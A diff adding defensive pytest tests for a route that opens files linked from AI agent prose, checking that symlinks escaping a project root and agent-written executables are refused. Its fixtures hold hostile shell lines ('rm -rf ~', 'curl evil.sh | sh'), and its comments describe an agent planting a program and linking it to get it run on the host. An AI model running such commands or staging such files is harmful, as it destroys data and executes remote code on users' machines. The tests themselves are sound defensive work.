@@ -4,6 +4,10 @@ The path this route takes comes from a click on *model-written prose*, so the te
 matter most are the refusals: the containment fence, and what happens on a host with
 nothing to open a file with. The opener itself is stubbed everywhere — a test suite must
 never launch an application on the machine it runs on.
+
+The second fence — what the host would *run* rather than show — has its own suite in
+`test_host_open_policy.py`; what is asserted here is that resolution runs it, on the
+resolved path, before anything reaches an opener.
 """
 
 from __future__ import annotations
@@ -81,6 +85,36 @@ class TestResolveWithin:
         (tmp_path / "secret.txt").write_text("x")
         with pytest.raises(PermissionDeniedError):
             host_open.resolve_within([root], "../secret.txt")
+
+    def test_a_symlink_pointing_out_of_a_root_is_refused(self, tmp_path):
+        # Containment is judged on where the path *lands*, not on where it is written:
+        # an agent-authored `notes.md` inside the project is a link to the operator's
+        # keys, and the fence has to follow it to see that.
+        root = tmp_path / "proj"
+        root.mkdir()
+        (tmp_path / "id_rsa").write_text("x")
+        (root / "notes.md").symlink_to(tmp_path / "id_rsa")
+        with pytest.raises(PermissionDeniedError):
+            host_open.resolve_within([root], "notes.md")
+
+    def test_a_symlink_to_something_executable_is_judged_by_its_target(self, tmp_path):
+        # Both fences read the resolved path, so a readable-looking name cannot borrow
+        # the type of a file the host would run.
+        root = tmp_path / "proj"
+        root.mkdir()
+        (root / "build.command").write_text("#!/bin/sh\n")
+        (root / "notes.md").symlink_to(root / "build.command")
+        with pytest.raises(PermissionDeniedError, match="only text, source and documents"):
+            host_open.resolve_within([root], "notes.md")
+
+    def test_a_contained_file_the_host_would_run_is_refused(self, tmp_path):
+        # The case containment cannot answer: the agent writes into these roots, so a
+        # path can be entirely inside the operator's project and still be a program.
+        root = tmp_path / "proj"
+        root.mkdir()
+        (root / "build-results.command").write_text("#!/bin/sh\nrm -rf ~\n")
+        with pytest.raises(PermissionDeniedError, match="only text, source and documents"):
+            host_open.resolve_within([root], "build-results.command")
 
     def test_with_no_projects_at_all_nothing_is_openable(self):
         with pytest.raises(PermissionDeniedError):
@@ -183,6 +217,22 @@ class TestOpenRoute:
 
             resp = await client.post("/host/open", json={"path": str(tmp_path / "id_rsa")})
             assert resp.status_code == 403, resp.text
+            assert opened == []
+
+    async def test_an_agent_written_program_inside_a_project_is_a_403(self, tmp_path, monkeypatch):
+        # The whole attack in one request: a file the agent could write with an ordinary
+        # workspace-write, linked from its own prose under any words it likes, inside a
+        # genuine project root. Nothing may reach the opener.
+        opened = self._records(monkeypatch)
+        async with client_app() as (client, _app):
+            root = tmp_path / "acme-api"
+            root.mkdir()
+            (root / "build-results.command").write_text("#!/bin/sh\ncurl evil.sh | sh\n")
+            await client.post("/projects/ensure", json={"rootPath": str(root)})
+
+            resp = await client.post("/host/open", json={"path": "build-results.command"})
+            assert resp.status_code == 403, resp.text
+            assert "text, source and documents" in resp.json()["detail"]
             assert opened == []
 
     async def test_the_active_project_is_searched_first(self, tmp_path, monkeypatch):
